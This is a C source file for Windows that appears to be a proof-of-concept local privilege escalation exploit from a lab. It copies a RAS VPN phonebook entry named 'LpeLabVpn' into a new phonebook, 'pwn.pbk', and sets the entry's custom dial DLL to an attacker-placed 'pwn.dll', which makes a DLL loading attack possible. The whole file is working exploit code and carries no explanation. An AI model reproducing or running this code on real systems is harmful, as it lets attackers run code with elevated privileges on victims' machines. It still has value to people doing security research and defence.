#include <windows.h>
#include <ras.h>
#include <stdio.h>

#pragma comment(lib, "rasapi32.lib")

#ifndef ERROR_BUFFER_TOO_SMALL
#define ERROR_BUFFER_TOO_SMALL 603L
#endif

int wmain(void) {
    const wchar_t* src_pbk =
        L"C:\\ProgramData\\Microsoft\\Network\\Connections\\Pbk\\rasphone.pbk";
    const wchar_t* src_pbk_candidates[] = {NULL, src_pbk};
    const wchar_t* src_entry = L"LpeLabVpn";
    const wchar_t* dst_pbk = L"C:\\Users\\Public\\Desktop\\EXPLOIT\\pwn.pbk";
    const wchar_t* dst_entry = L"pwn";

    DWORD size = 16384;
    DWORD device_size = 0;
    BYTE stack_buffer[16384];
    ZeroMemory(stack_buffer, sizeof(stack_buffer));
    ((LPRASENTRYW)stack_buffer)->dwSize = sizeof(RASENTRYW);
    DWORD err = 0;
    for (int i = 0; i < 2; ++i) {
        size = sizeof(stack_buffer);
        device_size = 0;
        ZeroMemory(stack_buffer, sizeof(stack_buffer));
        ((LPRASENTRYW)stack_buffer)->dwSize = sizeof(RASENTRYW);
        err = RasGetEntryPropertiesW(
            (LPWSTR)src_pbk_candidates[i],
            (LPWSTR)src_entry,
            (LPRASENTRYW)stack_buffer,
            &size,
            NULL,
            &device_size
        );
        wprintf(
            L"RasGetEntryPropertiesW(first,%ls) -> %lu size=%lu device=%lu\n",
            src_pbk_candidates[i] ? src_pbk_candidates[i] : L"(default)",
            err,
            size,
            device_size
        );
        if (err == ERROR_SUCCESS || err == ERROR_BUFFER_TOO_SMALL) {
            break;
        }
    }
    if (err == ERROR_SUCCESS) {
        lstrcpyW(
            ((LPRASENTRYW)stack_buffer)->szCustomDialDll,
            L"C:\\Users\\Public\\Desktop\\EXPLOIT\\pwn.dll"
        );
        err = RasSetEntryPropertiesW(
            (LPWSTR)dst_pbk,
            (LPWSTR)dst_entry,
            (LPRASENTRYW)stack_buffer,
            size,
            NULL,
            0
        );
        wprintf(L"RasSetEntryPropertiesW(dst) -> %lu\n", err);
        return (int)err;
    }
    if (err != ERROR_BUFFER_TOO_SMALL || size == 0) {
        return (int)err;
    }

    BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    if (!buffer) {
        return 1;
    }
    ((LPRASENTRYW)buffer)->dwSize = sizeof(RASENTRYW);

    err = RasGetEntryPropertiesW(
        (LPWSTR)src_pbk,
        (LPWSTR)src_entry,
        (LPRASENTRYW)buffer,
        &size,
        NULL,
        &device_size
    );
    wprintf(L"RasGetEntryPropertiesW(data) -> %lu size=%lu device=%lu\n", err, size, device_size);
    if (err != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, buffer);
        return (int)err;
    }

    lstrcpyW(
        ((LPRASENTRYW)buffer)->szCustomDialDll,
        L"C:\\Users\\Public\\Desktop\\EXPLOIT\\pwn.dll"
    );

    err = RasSetEntryPropertiesW(
        (LPWSTR)dst_pbk,
        (LPWSTR)dst_entry,
        (LPRASENTRYW)buffer,
        size,
        NULL,
        0
    );
    wprintf(L"RasSetEntryPropertiesW(dst) -> %lu\n", err);
    HeapFree(GetProcessHeap(), 0, buffer);
    return (int)err;
}
